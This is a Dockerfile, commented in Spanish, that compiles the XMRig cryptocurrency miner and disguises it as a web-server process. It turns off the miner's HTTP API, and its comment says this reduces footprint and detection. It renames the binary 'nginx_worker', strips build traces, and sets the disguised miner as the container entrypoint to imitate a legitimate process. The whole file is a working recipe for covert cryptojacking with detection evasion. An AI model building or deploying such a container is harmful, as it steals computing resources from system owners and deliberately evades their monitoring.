FROM ubuntu:22.04 AS builder

# Evitar prompts interactivos durante la instalación
ENV DEBIAN_FRONTEND=noninteractive

# Instalar herramientas de compilación y dependencias obligatorias de XMRig
RUN apt-get update && apt-get install -y \
    build-essential \
    cmake \
    uuid-dev \
    libssl-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    libhwloc-dev \
    wget \
    && rm -rf /var/lib/apt/lists/*

# Descargar y extraer el código fuente oficial de XMRig
RUN wget https://github.com/xmrig/xmrig/archive/refs/tags/v6.21.0.tar.gz \
    && tar -xf v6.21.0.tar.gz \
    && mkdir -p xmrig-6.21.0/build

WORKDIR /xmrig-6.21.0/build

# Configurar la compilación desactivando la API HTTP interna (reduce huella y detección)
# Compilar usando todos los núcleos disponibles
# Al finalizar, renombramos el binario compilado de "xmrig" a "nginx_worker"
RUN cmake .. -DWITH_HTTPD=OFF -DWITH_HWLOC=ON \
    && make -j$(nproc) \
    && mv xmrig /usr/local/bin/nginx_worker

# --- Etapa Final limpia para minimizar el tamaño y eliminar rastros de compilación ---
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Instalar solo las librerías en tiempo de ejecución necesarias
RUN apt-get update && apt-get install -y \
    libcurl4 \
    libssl3 \
    libjansson4 \
    libhwloc15 \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Copiar el binario camuflado desde la etapa de compilación
COPY --from=builder /usr/local/bin/nginx_worker /usr/local/bin/nginx_worker

# Configurar el punto de entrada simulando el proceso legítimo
ENTRYPOINT ["/usr/local/bin/nginx_worker"]
